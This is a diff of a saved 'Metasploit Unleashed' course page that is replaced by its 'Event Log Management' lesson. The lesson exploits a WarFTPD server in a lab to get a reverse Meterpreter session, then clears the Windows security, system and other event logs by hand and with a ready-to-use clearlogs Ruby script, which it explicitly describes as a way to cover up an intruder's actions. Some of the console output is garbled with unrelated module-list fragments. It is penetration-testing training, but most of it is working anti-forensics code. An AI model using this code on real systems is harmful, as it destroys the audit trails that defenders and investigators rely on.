@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Event Log Management - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Event_Log_Management" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Event_Log_Management&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Event_Log_Management&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Event_Log_Management&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,297 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Event Log Management</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Event_Log_Management#column-one">navigation</a>, <a href="Event_Log_Management#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Sometimes it's best to not have your activities logged. Whatever the reason, you may find a circumstance where you need to clear away the windows event logs. Looking at the source for the winenum script, located in 'scripts/meterpreter', we can see the way this function works.
+<br />
+<br />
+<pre>def clrevtlgs()
+	evtlogs = [
+		'security',
+		'system',
+		'application',
+		'directory service',
+		'dns server',
+		'file replication service'
+	]
+	print_status("Clearing Event Logs, this will leave and event 517")
+	begin
+		evtlogs.each do |evl|
+			print_status("\tClearing the #{evl} Event Log")
+			log = @client.sys.eventlog.open(evl)
+			log.clear
+			file_local_write(@dest,"Cleared the #{evl} Event Log")
+		end
+		print_status("All Event Logs have been cleared")
+	rescue ::Exception => e
+		print_status("Error clearing Event Log: #{e.class} #{e}")
+
+	end
+end</pre>
+<br />
+Let's look at a scenario where we need to clear the event log, but instead of using a premade script to do the work for us, we will use the power of the ruby interpreter in Meterpreter to clear the logs on the fly. First, let's see our Windows 'System' event log.
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<div class="center"><div class="floatnone"><a href="File:Eventlog-00.png" class="image"><img alt="Eventlog-00.png" src="http://www.offensive-security.com/w/images/1/1a/Eventlog-00.png" width="625" height="384" /></a></div></div>
 <p><br />
 <br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
+Now, let's exploit the system and manually clear away the logs. We will model our command off of the winenum script.  Running 'log = client.sys.eventlog.open('system')' will open up the system log for us.
 <br />
+<br />
+<pre>msf exploit(<span style='color:#ff0000;'>warftpd_165_user</span>) > <span style='color:#13C16A;'>exploit</span>
+
+<span style='color:#0000FF;'>[*]</span> Handler binding to LHOST 0.0.0.0
+<span style='color:#0000FF;'>[*]</span> Started reverse handler
+<span style='color:#0000FF;'>[*]</span> Connecting to FTP server 172.16.104.145:21...
+<span style='color:#0000FF;'>[*]</span> Connected to target FTP server.
+<span style='color:#0000FF;'>[*]</span> Trying target Windows 2000 SP0-SP4 English...
+<span style='color:#0000FF;'>[*]</span> Transmitting intermediate stager for over-sized stage...(191 bytes)
+<span style='color:#0000FF;'>[*]</span> Sending stage (2650 bytes)
+<span style='color:#0000FF;'>[*]</span> Sleeping before handling stage...
+<span style='color:#0000FF;'>[*]</span> Uploading DLL (75787 bytes)...
+<span style='color:#0000FF;'>[*]</span> Upload completed.
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 2 opened (172.16.104.130:4444 -> 172.16.104.145:1246)
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>irb</span>
+<span style='color:#0000FF;'>[*]</span> Starting IRB shell
+<span style='color:#0000FF;'>[*]</span> The 'client' variable holds the meterpreter client
+>> <span style='color:#13C16A;'>log = client.sys.eventlog.open('system')</span>
+=> #<#:0xb6779424 @client=#>, #>, #
+
+"windows/browser/facebook_extractiptc"=>#, "windows/antivirus/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#</pre>
+<br />
+Now we'll see if we can clear out the log by running 'log.clear'.
+<br />
+<br />
+<pre>>> <span style='color:#13C16A;'>log.clear</span>
+=> #<#:0xb6779424 @client=#>,
+
+/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#</pre>
+<br />
+Let's see if it worked.
+<br />
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="File:Eventlog-01.png" class="image"><img alt="Eventlog-01.png" src="http://www.offensive-security.com/w/images/a/a0/Eventlog-01.png" width="625" height="329" /></a></div></div>
+<p><br />
+<br />
+Success! We could now take this further, and create our own script for clearing away event logs.
+<br />
+<br />
+<pre># Clears Windows Event Logs
+
+
+evtlogs = [
+        'security',
+        'system',
+        'application',
+        'directory service',
+        'dns server',
+        'file replication service'
+        ]
+print_line("Clearing Event Logs, this will leave an event 517")
+evtlogs.each do |evl|
+        print_status("Clearing the #{evl} Event Log")
+        log = client.sys.eventlog.open(evl)
+        log.clear
+end
+print_line("All Clear! You are a Ninja!")</pre>
+<br />
+After writing our script, we place it in /pentest/exploits/framework3/scripts/meterpreter. Then, let's re-exploit the system and see if it works.
+<br />
+<br />
+<pre>msf exploit(<span style='color:#ff0000;'>warftpd_165_user</span>) > <span style='color:#13C16A;'>exploit</span>
+
+<span style='color:#0000FF;'>[*]</span> Handler binding to LHOST 0.0.0.0
+<span style='color:#0000FF;'>[*]</span> Started reverse handler
+<span style='color:#0000FF;'>[*]</span> Connecting to FTP server 172.16.104.145:21...
+<span style='color:#0000FF;'>[*]</span> Connected to target FTP server.
+<span style='color:#0000FF;'>[*]</span> Trying target Windows 2000 SP0-SP4 English...
+<span style='color:#0000FF;'>[*]</span> Transmitting intermediate stager for over-sized stage...(191 bytes)
+<span style='color:#0000FF;'>[*]</span> Sending stage (2650 bytes)
+<span style='color:#0000FF;'>[*]</span> Sleeping before handling stage...
+<span style='color:#0000FF;'>[*]</span> Uploading DLL (75787 bytes)...
+<span style='color:#0000FF;'>[*]</span> Upload completed.
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (172.16.104.130:4444 -> 172.16.104.145:1253)
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>run clearlogs</span>
+Clearing Event Logs, this will leave an event 517
+<span style='color:#0000FF;'>[*]</span> Clearing the security Event Log
+<span style='color:#0000FF;'>[*]</span> Clearing the system Event Log
+<span style='color:#0000FF;'>[*]</span> Clearing the application Event Log
+<span style='color:#0000FF;'>[*]</span> Clearing the directory service Event Log
+<span style='color:#0000FF;'>[*]</span> Clearing the dns server Event Log
+<span style='color:#0000FF;'>[*]</span> Clearing the file replication service Event Log
+All Clear! You are a Ninja!
+<u>meterpreter</u> > <span style='color:#13C16A;'>exit</span></pre>
+<br />
+And the only event left in the log on the system is the expected 517.
+<br />
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="File:Eventlog-03.png" class="image"><img alt="Eventlog-03.png" src="http://www.offensive-security.com/w/images/4/44/Eventlog-03.png" width="602" height="63" /></a></div></div>
+<p><br />
+<br />
+This is the power of Meterpreter. Without much background other than some sample code we have taken from another script, we have created a useful tool to help us cover up our actions.
+<br />
+<br />
+</p>
+<hr />
+<p><br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Post_Exploitation" title="MSF Post Exploitation">MSF Post Exploitation</a> &gt; Event Log Management</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Privilege_Escalation" title="Privilege Escalation">Privilege Escalation</a> &#124; <a href="PSExec_Pass_The_Hash" title="PSExec Pass The Hash">PSExec Pass The Hash</a> &#124; <strong class="selflink">Event Log Management</strong> &#124; <a href="Fun_With_Incognito" title="Fun With Incognito">Fun With Incognito</a> &#124; <a href="Interacting_With_The_Registry" title="Interacting With The Registry">Interacting With The Registry</a> &#124; <a href="Enabling_Remote_Desktop" title="Enabling Remote Desktop">Enabling Remote Desktop</a> &#124; <a href="Packet_Sniffing" title="Packet Sniffing">Packet Sniffing</a> &#124; <a href="Pivoting" title="Pivoting">Pivoting</a> &#124; <a href="TimeStomp" title="TimeStomp">TimeStomp</a> &#124; <a href="Screen_Capture" title="Screen Capture">Screen Capture</a> &#124; <a href="Searching_For_Content" title="Searching For Content">Searching For Content</a> &#124; <a href="John_The_Ripper" title="John The Ripper">John The Ripper</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 529/1000000
+Preprocessor generated node count: 2723/1000000
+Post‐expand include size: 4608/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:60-0!*!0!*!*!2!* and timestamp 20131123172112 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Event_Log_Management&amp;oldid=310">http://www.offensive-security.com/w/index.php?title=Event_Log_Management&amp;oldid=310</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:MSF_Post_Exploitation&amp;action=edit&amp;redlink=1" class="new" title="Category:MSF Post Exploitation (page does not exist)">MSF Post Exploitation</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +782,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.140 secs. --></body></html>
